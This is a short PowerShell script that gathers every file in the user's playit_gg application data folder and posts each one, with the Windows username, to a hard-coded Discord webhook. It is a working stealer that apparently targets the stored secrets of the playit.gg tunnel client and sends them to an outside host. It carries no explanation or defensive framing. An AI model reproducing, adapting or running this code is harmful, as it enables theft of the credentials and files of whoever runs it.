# Get the current user's username
$username = $env:USERNAME
# Construct the path
$path = "C:\Users\$username\AppData\Local\playit_gg"
# Check if the directory exists
if (Test-Path -Path $path) {
    # Get all files in the directory
    $files = Get-ChildItem -Path $path
    foreach ($file in $files) {
        # Read the file content as bytes
        $fileContent = [System.IO.File]::ReadAllBytes($file.FullName)
        # Create a boundary for multipart/form-data
        $boundary = [System.Guid]::NewGuid().ToString()
        
        # Prepare multipart form data with file and username
        $formParts = @(
            "--$boundary",
            'Content-Disposition: form-data; name="file"; filename="' + $file.Name + '"',
            "Content-Type: application/octet-stream`r`n",
            [System.Text.Encoding]::ASCII.GetString($fileContent),
            "--$boundary",
            'Content-Disposition: form-data; name="username"',
            "`r`n$username",
            "--$boundary--"
        )
        
        # Combine form parts
        $formContent = $formParts -join "`r`n"
        
        # Create the HTTP request
        $request = [System.Net.HttpWebRequest]::Create("https://discord.com/api/webhooks/1271841890274377809/iTW6zYB2qFb809-3SHLMy46Q2bv9ierSLaj8xgYk5r6b-NSdPqejC73R4cgMh9e3BVyr")
        $request.Method = "POST"
        $request.ContentType = "multipart/form-data; boundary=$boundary"
        
        # Write the form content to the request stream
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($formContent)
        $request.ContentLength = $bytes.Length
        $requestStream = $request.GetRequestStream()
        $requestStream.Write($bytes, 0, $bytes.Length)
        $requestStream.Close()
        
        # Send the request
        try {
            $response = $request.GetResponse()
            Write-Host "File uploaded successfully: $($file.Name)"
            $response.Close()
        } catch {
            Write-Error "Failed to upload file: $($_.Exception.Message)"
        }
    }
} else {
    Write-Host "Directory not found: $path"
}
